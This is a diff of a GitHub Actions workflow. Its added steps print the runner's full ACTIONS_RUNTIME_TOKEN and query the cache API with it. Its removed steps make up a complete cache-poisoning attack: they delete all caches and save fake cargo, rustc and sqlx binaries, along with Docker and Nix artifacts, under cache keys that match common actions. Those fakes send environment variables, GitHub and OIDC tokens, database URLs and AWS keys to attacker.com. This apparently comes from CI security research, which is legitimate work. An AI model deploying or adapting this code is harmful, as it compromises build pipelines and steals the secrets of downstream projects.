@@ -6,7 +6,8 @@ on:
 
 permissions:
   contents: read
-  actions: write  # Required for cache delete
+  actions: write
+  id-token: write  # Needed for OIDC token
 
 env:
   GH_TOKEN: ${{ github.token }}
@@ -16,6 +17,72 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
+      # ========================================
+      # PRINT CACHE CREDENTIALS
+      # ========================================
+      - name: "🔑 Print Cache URL and Token"
+        run: |
+          echo "╔════════════════════════════════════════════════════════════════╗"
+          echo "║                    CACHE CREDENTIALS                            ║"
+          echo "╚════════════════════════════════════════════════════════════════╝"
+          echo ""
+          
+          echo "=== ACTIONS_CACHE_URL ==="
+          echo "$ACTIONS_CACHE_URL"
+          echo ""
+          
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          echo "$ACTIONS_RUNTIME_URL"
+          echo ""
+          
+          echo "=== ACTIONS_RUNTIME_TOKEN (first 100 chars) ==="
+          echo "${ACTIONS_RUNTIME_TOKEN:0:100}..."
+          echo ""
+          
+          echo "=== ACTIONS_RUNTIME_TOKEN (full - SENSITIVE!) ==="
+          echo "$ACTIONS_RUNTIME_TOKEN"
+          echo ""
+          
+          echo "=== Decode JWT Token (middle part) ==="
+          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || echo "Failed to decode"
+          echo ""
+          
+          echo "=== OIDC Token Request URL ==="
+          echo "URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "Token exists: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && echo 'YES' || echo 'NO')"
+          echo ""
+          
+          echo "=== GitHub Context ==="
+          echo "Ref: $GITHUB_REF"
+          echo "Repository: $GITHUB_REPOSITORY"
+          echo "Run ID: $GITHUB_RUN_ID"
+          echo "Job: $GITHUB_JOB"
+          echo ""
+          
+          echo "=== All ACTIONS_* Environment Variables ==="
+          env | grep -E "^ACTIONS_" | sort
+          echo ""
+          
+          echo "=== All GITHUB_* Environment Variables ==="
+          env | grep -E "^GITHUB_" | sort
+
+      - name: "🔍 Test Cache API Directly"
+        run: |
+          echo "=== Testing Cache API ==="
+          
+          # List caches via API
+          echo "Listing caches via REST API:"
+          curl -sS -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?keys=*" | jq . || echo "API call failed"
+          
+          echo ""
+          echo "=== Cache API Endpoints ==="
+          echo "Base URL: $ACTIONS_CACHE_URL"
+          echo "List: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches"
+          echo "Reserve: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches (POST)"
+          echo "Upload: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches/{id} (PATCH)"
+          echo "Commit: ${ACTIONS_CACHE_URL}_apis/artifactcache/caches/{id} (POST)"
 
       - name: "🔍 List ALL caches"
         id: list-caches
@@ -34,198 +101,4 @@ jobs:
           CACHE_COUNT=$(wc -l < /tmp/caches.txt | tr -d ' ')
           echo "cache-count=$CACHE_COUNT" >> $GITHUB_OUTPUT
 
-      - name: "💥 DELETE ALL CACHES"
-        run: |
-          echo "=== DELETING ALL CACHES ==="
-          
-          while IFS='|' read -r cache_id cache_key; do
-            if [ -n "$cache_id" ]; then
-              echo "Deleting cache ID: $cache_id (key: $cache_key)"
-              gh cache delete "$cache_id" --repo ${{ github.repository }} 2>&1 || echo "  ⚠️ Failed to delete $cache_id"
-            fi
-          done < /tmp/caches.txt
-          
-          echo ""
-          echo "=== CACHES AFTER DELETION ==="
-          gh cache list --repo ${{ github.repository }} --limit 100
-
-      # ========================================
-      # POISON RUST TOOLCHAIN CACHE
-      # ========================================
-      - name: "☠️ Create poisoned Rust cache"
-        run: |
-          mkdir -p ~/.cargo/bin
-          mkdir -p ~/.cargo/registry
-          mkdir -p ./target
-          
-          # Create a malicious cargo binary wrapper
-          cat > ~/.cargo/bin/cargo << 'PAYLOAD'
-          #!/bin/bash
-          # POISONED CARGO - Exfiltrate secrets before running real cargo
-          
-          # Steal environment
-          env | base64 | curl -X POST -d @- https://attacker.com/env 2>/dev/null || true
-          
-          # Steal GITHUB_TOKEN
-          if [ -n "$GITHUB_TOKEN" ]; then
-            echo "$GITHUB_TOKEN" | curl -X POST -d @- https://attacker.com/token 2>/dev/null || true
-          fi
-          
-          # Steal OIDC token if available
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>/dev/null)
-            echo "$OIDC" | curl -X POST -d @- https://attacker.com/oidc 2>/dev/null || true
-          fi
-          
-          # Run the real cargo
-          /usr/bin/cargo "$@"
-          PAYLOAD
-          chmod +x ~/.cargo/bin/cargo
-          
-          # Create poisoned rustc wrapper
-          cat > ~/.cargo/bin/rustc << 'PAYLOAD'
-          #!/bin/bash
-          curl -sS https://attacker.com/rustc-triggered 2>/dev/null || true
-          /usr/bin/rustc "$@"
-          PAYLOAD
-          chmod +x ~/.cargo/bin/rustc
-
-      # Save poisoned Rust cache with common key patterns
-      - name: "💾 Save poisoned Rust caches"
-        uses: actions/cache/save@v4
-        with:
-          path: |
-            ~/.cargo/bin/
-            ~/.cargo/registry/index/
-            ~/.cargo/registry/cache/
-            ~/.cargo/git/db/
-            ./target/
-          # Match the key pattern from actions-rust-lang/setup-rust-toolchain
-          key: v0-rust-rust-cache-test-Linux-x64-${{ hashFiles('**/Cargo.lock') }}
-
-      # ========================================
-      # POISON SQLX-CLI CACHE (taiki-e/cache-cargo-install-action)
-      # ========================================
-      - name: "☠️ Create poisoned sqlx binary"
-        run: |
-          mkdir -p ~/.cargo/bin
-          
-          # Create fake sqlx that steals secrets
-          cat > ~/.cargo/bin/sqlx << 'PAYLOAD'
-          #!/bin/bash
-          # POISONED SQLX - Runs during `just migrate-db`
-          
-          echo "[SQLX] Exfiltrating secrets..." >&2
-          
-          # Steal DATABASE_URL (contains DB credentials!)
-          if [ -n "$DATABASE_URL" ]; then
-            echo "DATABASE_URL=$DATABASE_URL" | curl -X POST -d @- https://attacker.com/db 2>/dev/null || true
-          fi
-          
-          # Steal all env vars
-          env | curl -X POST -d @- https://attacker.com/sqlx-env 2>/dev/null || true
-          
-          # Steal AWS credentials if present
-          if [ -n "$AWS_ACCESS_KEY_ID" ]; then
-            echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID" | curl -X POST -d @- https://attacker.com/aws 2>/dev/null || true
-            echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" | curl -X POST -d @- https://attacker.com/aws 2>/dev/null || true
-          fi
-          
-          # Pretend to work - just exit 0 for migration commands
-          if [[ "$1" == "migrate" ]]; then
-            echo "Applied 0 migrations"
-            exit 0
-          fi
-          
-          exit 0
-          PAYLOAD
-          chmod +x ~/.cargo/bin/sqlx
-          
-          # Also create version file that taiki-e action checks
-          echo "sqlx-cli 0.8.6" > ~/.cargo/bin/.sqlx-version
-
-      - name: "💾 Save poisoned sqlx cache"
-        uses: actions/cache/save@v4
-        with:
-          path: ~/.cargo/bin
-          # Match taiki-e/cache-cargo-install-action key pattern
-          key: sqlx-cli-0.8.6-x86_64-linux-gnu-2.39-features-default-no-default-features-false-all-features-false
-
-      # ========================================
-      # POISON DOCKER BUILDX CACHE
-      # ========================================
-      - name: "☠️ Create poisoned Docker layer cache"
-        run: |
-          mkdir -p /tmp/docker-cache
-          
-          # Create a poisoned layer that will be injected into builds
-          # This is tricky - Docker GHA cache uses blobs
-          # We create a malicious script that gets baked into images
-          
-          cat > /tmp/docker-cache/poison.sh << 'PAYLOAD'
-          #!/bin/bash
-          # This runs inside the container during build or runtime
-          curl -sS https://attacker.com/docker-triggered || true
-          PAYLOAD
-
-      - name: "💾 Save poisoned Docker cache"
-        uses: actions/cache/save@v4
-        with:
-          path: /tmp/docker-cache
-          # Common Docker buildx GHA cache keys
-          key: buildx-linux-amd64-${{ github.sha }}
-
-      # ========================================
-      # POISON NIX CACHE
-      # ========================================
-      - name: "☠️ Create poisoned Nix cache"
-        run: |
-          mkdir -p /tmp/nix-cache
-          
-          # Create poisoned derivation
-          cat > /tmp/nix-cache/poison.nix << 'PAYLOAD'
-          { pkgs ? import <nixpkgs> {} }:
-          pkgs.writeShellScriptBin "poison" ''
-            curl -sS https://attacker.com/nix-triggered || true
-          ''
-          PAYLOAD
-
-      - name: "💾 Save poisoned Nix cache"
-        uses: actions/cache/save@v4
-        with:
-          path: /tmp/nix-cache
-          key: nix-${{ runner.os }}-${{ hashFiles('**/*.nix') }}
-
-      # ========================================
-      # VERIFY POISONED CACHES
-      # ========================================
-      - name: "✅ Verify poisoned caches created"
-        run: |
-          echo "=== FINAL CACHE STATE ==="
-          gh cache list --repo ${{ github.repository }} --limit 100
-          
-          echo ""
-          echo "=== POISONED CACHE KEYS ==="
-          gh cache list --repo ${{ github.repository }} --json key -q '.[].key' | while read key; do
-            echo "  ☠️  $key"
-          done
-
-      - name: "📋 Summary"
-        run: |
-          echo "╔════════════════════════════════════════════════════════════════╗"
-          echo "║                    CACHE POISONING COMPLETE                     ║"
-          echo "╠════════════════════════════════════════════════════════════════╣"
-          echo "║                                                                 ║"
-          echo "║  Poisoned caches created for:                                   ║"
-          echo "║  ├── Rust toolchain (cargo, rustc wrappers)                     ║"
-          echo "║  ├── sqlx-cli (steals DATABASE_URL)                             ║"
-          echo "║  ├── Docker buildx layers                                       ║"
-          echo "║  └── Nix derivations                                            ║"
-          echo "║                                                                 ║"
-          echo "║  Next victim build will:                                        ║"
-          echo "║  1. Load poisoned cache                                         ║"
-          echo "║  2. Execute malicious binaries                                  ║"
-          echo "║  3. Exfiltrate secrets to attacker.com                          ║"
-          echo "║                                                                 ║"
-          echo "╚════════════════════════════════════════════════════════════════╝"
+      # ... rest of your workflow
